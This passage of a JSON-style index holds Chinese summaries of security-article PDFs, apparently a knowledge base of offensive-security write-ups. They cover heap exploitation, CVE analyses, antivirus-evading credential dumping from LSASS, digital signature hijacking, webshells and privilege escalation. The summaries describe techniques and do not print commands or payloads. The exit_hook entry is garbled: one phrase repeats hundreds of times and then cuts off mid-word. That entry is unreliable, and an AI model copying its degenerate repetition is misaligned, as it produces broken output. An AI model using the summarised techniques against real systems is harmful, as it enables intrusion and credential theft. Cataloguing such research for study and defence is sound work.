        "page_content": "该文档分析了 Java 中 Nashorn JavaScript 解析引擎的特性和绕过技术，重点关注了全局变量属性、Java 全局对象、兼容 Rhino 功能和 JavaImporter，并通过源码分析发现了 unicode 换行符和注释函数分析的绕过方法。",
        "FileName": "8697-java中js命令执行的攻与防2.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-1938 漏洞，该漏洞影响 Apache Tomcat，允许通过 AJP 协议进行文件读取和文件包含，从而导致远程代码执行。文档详细介绍了 Tomcat 的组件和处理请求的流程，并逐步分析了漏洞的触发方式和利用过程，最后提供了官方修复措施。",
        "FileName": "7683-Tomcat Ghostcat - AJP协议文件读取文件包含漏洞（CVE-2020-1938  CNVD-2020-10487）.pdf"
    },
    {
        "page_content": "**主题：**绕过杀毒软件获取 Windows 用户凭证的多种方法\n\n**内容：**本文介绍了多种绕过杀毒软件获取 Windows 用户凭证的方法，包括使用微软签名的白名单程序、利用 comsvcs.dll 的 MiniDump 函数、使用 Avast 杀毒软件中的 AvDump.exe、利用 DumpMinitool.exe、利用 SilentProcessExit 机制、获取 Debug 权限并使用 MiniDump 或 MiniDumpWriteDump 进行内存转储，以及编写一个绕过杀毒软件的 DLL 来转储 Lsass 进程。",
        "FileName": "11199-dumphash bypass杀软的多种方式.pdf"
    },
    {
        "page_content": "该文档介绍了 House-Of-Roman 技术，该技术结合了 fastbin attack 和 unsortbin attack，用于绕过 ALSR，通过爆破 12 位来获取 shell。该技术需要一个 UAF 漏洞和创建任意大小 chunk 的能力。文档详细介绍了该技术的五个步骤，包括修改 fastbin 的 fd、修复 fastbin 链、通过 unsortedbin attack 将 main_arean 地址写入 malloc_hook、修改 malloc_hook 中的地址为 one gadget，以及多次 free 同一个 chunk 触发 double free 异常，从而触发 malloc_printerr 和 malloc，最终获取 shell。",
        "FileName": "7426-House-Of-Roman技术分析及例题新解.pdf"
    },
    {
        "page_content": "该文档介绍了如何搭建一个企业级网络钓鱼演练平台，该平台利用 GoPhish 和 EwoMail 邮件服务器，可以模拟钓鱼邮件并跟踪受害者的行为，用于员工钓鱼意识培训。",
        "FileName": "11898-企业级钓鱼演练平台搭建.pdf"
    },
    {
        "page_content": "该文档主要介绍了针对某人才系统漏洞的挖掘过程，包括SQL注入、RCE和任意文件包含漏洞的分析和利用方法。该系统存在多个漏洞，攻击者可以通过精心构造的payload绕过安全措施，执行任意代码或获取敏感信息。",
        "FileName": "10301-某人才系统漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何以初学者的角度调试 Filter 内存马，通过跟踪 Filter 注解的初始化流程和运行时调试方式，了解 Filter 的动态注册过程。文档详细阐述了 FilterDef、FilterMap 和 FilterConfig 三个变量在 Filter 注册和运行中的作用，并提供了动态注册 Filter 的代码示例。",
        "FileName": "10196-以初学者角度调试filter内存马.pdf"
    },
    {
        "page_content": "House Of Storm 是一种利用 unsortedbin attack 和 Largebin attack 相结合的攻击技术，其原理与 Largebin attack 类似，可以达到任意地址写的效果，危害极大。该技术需要满足以下条件：glibc 版本小于 2.30、攻击者在 largebin 和 unsorted_bin 中分别布置一个 chunk、这两个 chunk 归位后处于同一个 largebin 的 index 中且 unsortedbin 中的 chunk 要比 largebin 中的大、unsorted_bin 中的 bk 指针可控、largebin 中的 bk 指针和 bk_nextsize 指针可控。",
        "FileName": "12673-House Of Storm.pdf"
    },
    {
        "page_content": "该文档介绍了 ysoserial AspectJWeaver 文件写入小工具，该小工具利用了 AspectJWeaver、commons-collections 和 LazyMap 中的漏洞，允许攻击者通过反序列化写入文件。该小工具使用 HashSet.readObject()、HashMap.put()、TiedMapEntry.hashCode()、LazyMap.get() 和 SimpleCache$StorableCachingMap.writeToPath() 的调用链来触发文件写入。",
        "FileName": "9168-ysoserial AspectJWeaver file write gadget.pdf"
    },
    {
        "page_content": "该文档分析了 pbootcms 最新版本前台 RCE 漏洞，重点关注如何绕过其严格的正则表达式防御机制。通过分析历史漏洞和绕过技巧，作者提出了一个绕过所有三个正则表达式的有效 payload，从而实现 RCE。该漏洞的修复方法尚未提供，但作者建议参考官方文档。",
        "FileName": "8663-pbootcms最新版本前台捡的rce-论如何绕废正则.pdf"
    },
    {
        "page_content": "本文分析了 TestLink 登录流程中的安全漏洞，包括默认密码、默认重装漏洞、开放重定向导致的 XSS 攻击、LDAP 注入和第三方认证后的设计缺陷。这些漏洞可能导致任意重定向、XSS 攻击、LDAP 服务器资源耗尽、间接控制查询结果和自动添加用户（并设置默认密码）。",
        "FileName": "10458-实战代码审计：TestLink登录流程分析.pdf"
    },
    {
        "page_content": "Open Source Social Network (OSSN) 5.3 之前的版本中存在一个任意文件读取漏洞 (CVE-2020-10560)，该漏洞是由 OSSN 生成的 Site_Key 强度过低导致的，攻击者可以通过暴力破解 Site_Key 来构造任意文件读取链接，并通过评论功能提供的文件预览接口读取文件。",
        "FileName": "7654-Rand函数引发的安全问题 —— OSSN任意文件读取漏洞（CVE-2020-10560）.pdf"
    },
    {
        "page_content": "**主题：** Spring RCE 漏洞 (CVE-2022-22965) 分析\n\n**内容：** 该漏洞利用了 Spring 框架中对传入参数和 JavaBean 属性对比的缺陷，允许攻击者通过精心设计的请求绕过安全检查，修改 Tomcat 访问日志配置。漏洞成因在于 Spring 框架对属性的检查不够全面，导致攻击者可以利用 Java 内置的 class 属性和 Spring 的 JavaBean 属性注入特性，绕过检查并修改 Tomcat 访问日志配置。",
        "FileName": "11136-spring rce 漏洞分析（CVE-2022-22965）.pdf"
    },
    {
        "page_content": "本文主要介绍了如何使用 Go 语言爬取和收集 AlmaLinux 操作系统的漏洞情报，包括数据源、数据结构、关键方法、工具包总结、第三方库和运行结果等方面。",
        "FileName": "12083-漏洞情报收集（一）：AlmaLinux操作系统漏洞情报收集.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 ESC1、ESC8 和 CVE-2022-26923 漏洞在 Active Directory 证书服务 (ADCS) 中提升权限。它提供了详细的步骤，包括信息枚举、漏洞配置、证书请求和权限提升，以帮助攻击者在域内和域外环境中利用这些漏洞。",
        "FileName": "11627-ADCS攻击笔记.pdf"
    },
    {
        "page_content": "该文档详细介绍了 AWD 攻击技术，包括 C 段存活扫描、组件检索、主机嗅探、端⼝扫描、关键⽂件检索、⽹站⾸⻚定位、⽇志⽂件检索、备份检索、多进程批量⽹站备份⽂件泄露扫描、上传后门常⻅⼀句话⽊⻢、shell ⽂件名隐藏⽊⻢、绕 waf⽊⻢、MD5 ⽊⻢、IP 验证⽊⻢、混淆⻢、不死⻢等。",
        "FileName": "12687-AWD攻击技术小结详解.pdf"
    },
    {
        "page_content": "该文档讨论了验证绕过漏洞，重点关注 JavaScript 验证绕过。作者通过分析一个登录系统的 JavaScript 代码，发现只验证了用户名，而没有验证密码，从而绕过了登录验证并获得了后台访问权限。作者强调了在渗透测试中仔细检查验证功能的重要性，即使代码看起来复杂，也可能存在突破口。",
        "FileName": "8932-Js跟踪到未授权访问.pdf"
    },
    {
        "page_content": "该文档详细介绍了对熊海 CMS 进行代码审计的过程，重点关注其文件包含、SQL 注入、XSS 和 CSRF 漏洞。审计发现该 CMS 存在大量未过滤的输入，导致各种安全漏洞，使其成为初学者进行代码审计的理想选择。",
        "FileName": "10942-初次代码审计之熊海cms.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用 MySQL 数据库漏洞进行提权的各种方法，包括 SQL 身份认证漏洞、UDF 提权、MOF 提权和反弹端口提权。它提供了详细的步骤和示例代码，涵盖了从登录数据库到添加管理员帐户和执行命令的整个过程。",
        "FileName": "7392-mysql数据库漏洞利用及提权方式小结.pdf"
    },
    {
        "page_content": "Spring Boot Actuator 是一个生产环境部署时可使用的功能，用于监控和管理应用程序。它支持通过 HTTP 端点或 JMX 访问，并提供对应用程序审计、健康和指标信息的查看。本文分析了 Actuator 在 Spring Boot 1.x 和 2.x 版本中的差异，并讨论了利用其未授权访问端点进行敏感信息泄露、命令执行和修改运行状态等漏洞的思路。",
        "FileName": "9763-Spring Boot Actuator 未授权的测试与利用思路.pdf"
    },
    {
        "page_content": "该文档介绍了使用 Goby 扫描器通过 PHP 反射注入漏洞在目标网站上执行恶意代码，包括弹 Xss 弹窗、反弹计算器、反弹 Shell 和上线 CS。该漏洞利用了 PHP 的 X-Powered-By 头部，通过在其中嵌入恶意 JavaScript 代码来执行任意命令。",
        "FileName": "10632-红队攻防之Goby反杀.pdf"
    },
    {
        "page_content": "该文档分析了百家 CMS v4.1.4 中的三个漏洞，包括任意文件删除、远程文件上传和远程命令执行。这些漏洞允许攻击者删除任意文件、上传恶意文件并执行任意命令，从而对网站造成严重影响。",
        "FileName": "9955-百家CMS v4.1.4代码审计.pdf"
    },
    {
        "page_content": "本文档介绍了 Linux 操作系统的提权方法，包括内核提权、密码复用、反弹 shell、脏牛漏洞、SUID 提权、历史记录提权、计划任务提权和配置错误引发提权。它还提供了 Linux 权限提升审核工具和 Searchsploit 等工具，以帮助识别和利用漏洞。",
        "FileName": "8139-提权学习之旅——Linux操作系统提权.pdf"
    },
    {
        "page_content": "该文档总结了格式化字符串的payload生成，并提供了32位和64位格式化字符串的payload生成代码。该代码通过修改pwntools的源代码，使其支持64位格式化字符串，并解决了堆和bss段格式化字符串的问题。",
        "FileName": "7110-格式化字符串总结.pdf"
    },
    {
        "page_content": "本文分析了中国菜刀、中国蚁剑、冰蝎 Shell 管理工具和哥斯拉 Shell 管理工具这四种主流 WebShell 管理工具的加密特征，探讨了它们的加密方式和检测思路。这些工具通过使用不同的编码器和解码器对请求和响应流量进行加密，给防守方检测带来了挑战。防守方需要了解攻击方的加密武器，才能找到相应的破解方法。",
        "FileName": "9397-四大主流WebShell管理工具分析  防守方攻略.pdf"
    },
    {
        "page_content": "本文探讨了 Java 反射机制，它允许在运行时动态获取类和对象的信息并调用方法。通过示例代码，文章展示了如何使用反射获取类、实例化对象、获取属性和方法，以及调用私有方法和执行命令。",
        "FileName": "12649-JAVA安全初探(一)从面向对象编程到Java反射.pdf"
    },
    {
        "page_content": "**主题：** 利用 Shiro 权限绕过漏洞上传恶意文件\n\n**内容：** 该文档详细介绍了如何利用 Shiro 权限绕过漏洞，通过构造上传包绕过权限控制，上传恶意文件到目标服务器，从而获得远程代码执行权限。文档提供了具体步骤和代码示例，并讨论了绕过 multipart 参数解析的技巧。",
        "FileName": "8311-shiro权限绕过实战利用.pdf"
    },
    {
        "page_content": "该文档分析了 Apache ActiveMQ NMS 中的远程代码执行 (RCE) 漏洞，该漏洞允许攻击者在受影响的安装上执行任意代码。该漏洞源于 Body 访问器方法中缺乏对用户提供数据的适当验证，导致反序列化不可信数据。攻击者可以利用此漏洞在当前进程的上下文中执行代码。受影响的组件包括 activemq-nms-openwire < 2.1.0-rc1 和 Apache.NMS.AMQP.dll < 2.1.0 等。",
        "FileName": "12843-Apache ActiveMQ NMS RCE 漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 Burp Suite 和 mitmproxy 来解密加密站点的数据。Burp Suite 的插件可以方便地对通过 bp 的数据进行加密和解密，而 mitmproxy 则可以通过编写代理拦截脚本来处理加密数据。通过设置好插件的 python 路径和脚本路径，启动插件，就可以解密数据了。对于全数据包加密的数据处理起来更方便，而局部加密的数据就需要多加几行代码。",
        "FileName": "12652-如何测试加密站点.pdf"
    },
    {
        "page_content": "该文档主要讨论了 XXE 攻击的防御方法，重点介绍了通过设置 XML 解析库中的特定功能来实现防御。文档中提到了多种功能，包括 `XMLConstants.FEATURE_SECURE_PROCESSING`、`http://apache.org/xml/features/disallow-doctype-decl`、`http://xml.org/sax/features/external-general-entities` 和 `javax.xml.stream.isSupportingExternalEntities`。通过设置这些功能，可以禁用外部实体解析、禁止 DTD 声明或限制协议访问，从而有效防御 XXE 攻击。",
        "FileName": "7105-从源码层面看XXE的防御.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 glibc-2.34 中的 exit_hook 漏洞进行攻击的方法。攻击者可以通过触发程序结束（显式调用 exit 函数或由 libc_start_main 启动的主函数正常退出）来利用此漏洞，从而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_fini 函数，进而调用 _dl_",
        "FileName": "12856-exit_hook攻击利用.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用本地文件包含（LFI）漏洞（CVE-2022-22963）在Linux机器“Inject”上获得root权限。通过枚举文件系统，发现了一个易受Spring-Cloud-Function-Web漏洞影响的应用程序，利用该漏洞建立了初始访问点。随后，通过枚举发现了用户明文密码和运行的cronjob计划任务，最终通过创建恶意ansible脚本提升了权限。",
        "FileName": "12710-利用lfl文件包含发现CVE-2022-22963拿到root.pdf"
    },
    {
        "page_content": "本文档探讨了 JSON Web Token (JWT) 的攻击，包括签名无效、空加密算法、密钥爆破、修改算法、修改 JKU/X5U 参数、信息泄露和利用 Python 反序列化。攻击者可以通过修改 JWT 的各个部分或利用其弱点来绕过安全机制，从而获得未经授权的访问或执行恶意代码。",
        "FileName": "9376-JWT攻击学习.pdf"
    },
    {
        "page_content": "该文档探讨了文件包含漏洞，包括本地和远程文件包含漏洞，以及利用伪协议（如 php://filter、php://input、zip://、phar://、data:text/plain 和 file://）进行文件包含的示例。它还提供了修复文件包含漏洞的建议，例如使用 open_basedir 配置、过滤特殊字符和关闭 allow_url_include 配置。",
        "FileName": "7176-浅谈文件包含漏洞.pdf"
    },
    {
        "page_content": "该文档分析了一个名为“记某红队钓⻥样本浅分析”的恶意软件样本，该样本利用合法程序的数字签名（“⽩加⿊”）释放恶意文件，包括一个远程注入线程，该线程向外部发起请求并创建新线程。该样本的主要目的是在运行时释放恶意文件并执行恶意操作。",
        "FileName": "12247-记某红队钓鱼样本浅分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2023-21931 Weblogic JNDI 注入漏洞的原理，该漏洞允许攻击者通过发送 T3 协议给 Weblogic 服务来造成 JNDI 注入。漏洞的成因在于 lookup 方法中存在可控的 lookup 方法调用，导致攻击者可以通过 LinkRef#getLinkName 方法获取 LDAP 查询字符串，从而进行 JNDI 注入攻击。文档还提供了漏洞利用的 POC，演示了如何将恶意 LinkRef 对象绑定到服务端并进行 lookup 查询以触发 JNDI 注入。",
        "FileName": "12452-CVE-2023-21931 Weblogic JNDI注入漏洞原理分析及漏洞利用.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic CVE-2020-2551 漏洞，包括 Java 反序列化漏洞中涉及的概念，如 CORBA、GIOP、JNDI、LDAP、RMI 和 JRMP。它还提供了 RMI 反序列化漏洞攻击原理、攻击演示以及解决 WebLogic CVE-2020-2551 POC 网络问题的步骤。",
        "FileName": "7725-从0学习WebLogic CVE-2020-2551漏洞.pdf"
    },
    {
        "page_content": "内网穿透是指利用各种隧道技术，绕过网络防火墙的封锁，实现访问被封锁的目标网络。内网主机出网和入网的方式多种多样，根据不同的情况，可以灵活设计对应的内网穿透方案。常见的内网穿透工具包括DNS隧道、HTTP隧道、SSH隧道、ICMP隧道等，这些工具可以按所处的协议层分层，包括网络层隧道、传输层隧道和应用层隧道。",
        "FileName": "7701-内网渗透之内网穿透.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-17096 漏洞，该漏洞存在于 NTFS 模块中，导致非分页池中的内存泄漏。该漏洞源于 NtfsOffloadRead 函数中对 IrpContext 参数的处理不当，导致在处理 FSCTL_OFFLOAD_READ 请求时未正确释放资源，从而导致内存泄漏。",
        "FileName": "8996-NTFS CVE-2020-17096 分析复现.pdf"
    },
    {
        "page_content": "该文档主要介绍了 house of husk 漏洞的原理、利用条件、利用方法和源码分析。该漏洞利用了 glibc 中 printf 函数的两个表 __printf_function_table 和 __printf_arginfo_table，通过劫持这两个表，可以将程序流劫持到任意地址，从而实现任意代码执行。",
        "FileName": "12304-house of huck 心得体会.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Framework 中的两个远程命令执行漏洞（CVE-2010-1622 和 CVE-2022-22965），这些漏洞允许攻击者通过修改 Tomcat 日志配置来执行任意代码。漏洞利用了 Spring 中参数绑定的多层嵌套，并绕过了 Spring 和 Tomcat 中的缓解措施，例如黑名单和资源限制。",
        "FileName": "11281-spring rce 从cve-2010-1622到CVE-2022-22965 篇二.pdf"
    },
    {
        "page_content": "该文档分析了某开源堡垒机（Teleport）的历史漏洞，包括逻辑缺陷、任意文件读取、存储 XSS、CSRF 漏洞和未授权漏洞。这些漏洞存在于不同版本的 Teleport 中，其中一些漏洞在最新版本中仍然存在。文档提供了漏洞的详细分析和利用方法，并提供了相关 CVE 链接和 GitHub 问题链接。",
        "FileName": "11721-某开源堡垒机历史漏洞分析.pdf"
    },
    {
        "page_content": "**主题：** Typecho 反序列化漏洞分析\n\n**内容：** 该漏洞存在于 Typecho 1.0.14 及更早版本中，攻击者可以通过构造恶意序列化数据触发反序列化，从而执行任意 PHP 代码。漏洞利用涉及使用魔术方法，如 `__toString()` 和 `__get()`，以及危险函数 `call_user_func`。攻击者可以通过提交恶意数据来触发漏洞，导致服务器回显 500 错误，但仍会执行命令。",
        "FileName": "9428-Typecho反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 ARM 架构中的万能 gadget 来进行 pwn 攻击。它详细解释了如何使用特殊的 gadget 来控制寄存器值，泄露 libc 地址，并劫持程序流以执行任意代码。文档还提供了示例代码和调试技巧，以帮助读者理解和实施该技术。",
        "FileName": "12213-arm架构pwn的万能gadget利用.pdf"
    },
    {
        "page_content": "该文档提供了内网渗透初识阶段的信息收集方法，包括使用各种命令和工具收集有关操作系统、软件、服务、用户、域信息、端点和域控制器等信息。这些信息对于了解目标环境并为进一步的渗透做好准备至关重要。",
        "FileName": "7663-内网渗透初识—信息收集.pdf"
    },
    {
        "page_content": "该文档详细描述了从外网渗透到内网的过程，包括信息收集、漏洞利用、提权、横向渗透和域控攻击等技术，最终成功获取域控权限并拿到flag。",
        "FileName": "10205-记一次外网打点到内网渗透.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-20090 漏洞，该漏洞影响多款设备的身份验证绕过。作者通过获取设备文件系统、分析 HTTP 服务器二进制文件和利用路径遍历技术，绕过了身份验证并获得了对设备的 root shell 访问权限。该文档还提供了对 ASUS DSL-AC68VG 设备固件的类似分析，展示了如何利用相同的漏洞来绕过身份验证并启用 telnet 访问。",
        "FileName": "10370-CVE-2021-20090 多款设备身份验证绕过漏洞分析.pdf"
    },
    {
        "page_content": "这篇文档提供了使用 BurpSuite 进行渗透测试的一些实用技巧，包括解决光标错位、自动匹配关注词、过滤不必要的流量、隐藏特定方法的请求、禁用 Burp Collaborator 弹出窗口、切换模块选项卡视图、命名选项卡、在浏览器中重复请求以及转换请求格式。",
        "FileName": "11132-BurpSuite测试中一些常用tips.pdf"
    },
    {
        "page_content": "**主题：** Reverse Tabnabbing 攻击是一种网络钓鱼攻击，攻击者利用 window.opener API 在新打开的页面中修改原始页面，从而窃取用户凭证。\n\n**内容：** Reverse Tabnabbing 攻击利用了具有 target=\"_blank\" 属性且未设置 rel=\"noopener\" 属性的 HTML 链接或 window.open() 方法，允许恶意页面访问 window.opener API 并修改原始页面，将其重定向到钓鱼页面，从而窃取用户敏感信息。",
        "FileName": "7080-钓鱼攻击之Reverse Tabnabbing.pdf"
    },
    {
        "page_content": "该文档讨论了数字签名劫持技术，该技术允许攻击者绕过数字签名验证并执行恶意代码。它解释了数字签名验证的工作原理，并提供了分步说明，说明如何使用 SigThief 工具修改注册表以削弱验证机制。该技术可用于绕过杀毒软件检测并执行未签名的恶意软件。",
        "FileName": "9174-数字签名劫持.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Druid 中的 CVE-2021-25646 远程代码执行漏洞，该漏洞允许攻击者通过向 Jackson 反序列化对象添加 JacksonInject 注解的属性来执行任意代码。漏洞的触发点是 JavaScriptDimFilter 类，它使用 JavaScriptPredicateFactory 对象来执行 JavaScript 代码，该对象可以由用户控制。",
        "FileName": "9229-Druid远程代码执行漏洞分析（CVE-2021-25646）.pdf"
    },
    {
        "page_content": "该文档提供了有关内存分析和 Wi-Fi 流量分析的详细说明，包括使用 Volatility 工具分析虚拟机内存、解密华为手机备份文件、分析 Wi-Fi 流量并解密哥斯拉流量以获取 flag。",
        "FileName": "10266-陇剑杯wp——内存分析和wifi.pdf"
    },
    {
        "page_content": "该文档总结了绕过 PHP 中 disable_functions 设置的各种方法，包括利用 Windows 组件 COM、Linux 环境变量 LD_PRELOAD、PHP 7.4 的 FFI 特性、Bash Shellshock 漏洞、imap_open() 函数漏洞、Pcntl 组件、ImageMagick 漏洞、Apache Mod CGI、PHP-FPM、GC UAF、Json Serializer UAF、Backtrace UAF 和 iconv 漏洞。",
        "FileName": "10057-bypass disable_functions姿势总结.pdf"
    },
    {
        "page_content": "本文档分析了 Struts2 内存马的注入方法，通过修改恶意类加载器，成功将内存马注入到 Struts2 中，实现了任意命令执行。",
        "FileName": "12237-步履维艰之Struts2内存马.pdf"
    },
    {
        "page_content": "ImageMagick 7.1.0-49 中的两个漏洞（CVE-2022-44267 和 CVE-2022-44268）允许攻击者通过上传恶意 PNG 图像来触发拒绝服务攻击或泄露任意本地文件内容，这些漏洞可以通过解析 PNG 图像时等待 stdin 输入或将文本块解释为文件名并加载内容来利用。",
        "FileName": "12133-ImageMagick CVE-2022-44267、CVE-2022-44268漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 Android NFC 条件竞争漏洞 (CVE-2021-0870)，该漏洞存在于 NFC Reader/Write 模式中，攻击者可以通过将 NFC 的 TCB 置零的方式在不同 tag 之间切换，从而实现远程代码执行。漏洞成因是 TCB 所在的内存区域是固定不变的，当 TCB 被置零后即表示上一个状态已被禁用，但是新 tag 激活后，上一个状态的超时检测定时器仍然在工作，并且仍然引用 TCB 里的数据和指针，此时 TCB 已经被置零，随后新状态启动自己的定时器重写 TCB 中相应偏移的数据时，会产生条件竞争。",
        "FileName": "10815-Android NFC条件竞争漏洞分析（CVE-2021-0870）.pdf"
    },
    {
        "page_content": "该文档主要介绍了一种基于 Tomcat 全局存储的新思路，通过获取 StandardContext 和 response，解决了 Tomcat 7+Shiro 的回显问题。该方法通过反射修改 ApplicationFilterChain 参数，让 Tomcat 在下一次请求时在线程中缓存 req 和 resp，从而实现回显。",
        "FileName": "7535-tomcat不出网回显连续剧第六集.pdf"
    },
    {
        "page_content": "本文分析了 16 道 BAT XSS 实例，重点介绍了第六题的构造和绕过思路。该题通过过滤问号和百分号来防御 XSS 攻击，但作者通过利用换行符绕过正则表达式过滤，并使用 iframe 和 jQuery 的 domxss 特性绕过长度限制，成功构造了 XSS 攻击。文章强调了前端基础知识和调试方法在 XSS 绕过中的重要性。",
        "FileName": "11790-一些BAT的XSS实例（五）最终篇.pdf"
    },
    {
        "page_content": "该文档介绍了如何通过伪装数据和利用验证码绕过网络安全实验室综合关 7 的登录限制，通过绑定手机号和修改密码，最终获得管理员权限并获取密钥。",
        "FileName": "12166-网络安全实验室7.综合关.pdf"
    },
    {
        "page_content": "该文档分析了 Java 框架 Struts2 中的两个历史漏洞：Struts2-003 和 Struts2-005。Struts2-003 是一个远程代码执行漏洞，而 Struts2-005 是 Struts2-003 补丁的绕过。文档详细介绍了漏洞的概要、环境、分析、修复和 POC，并强调了 OGNL 表达式在这些漏洞中的关键作用。",
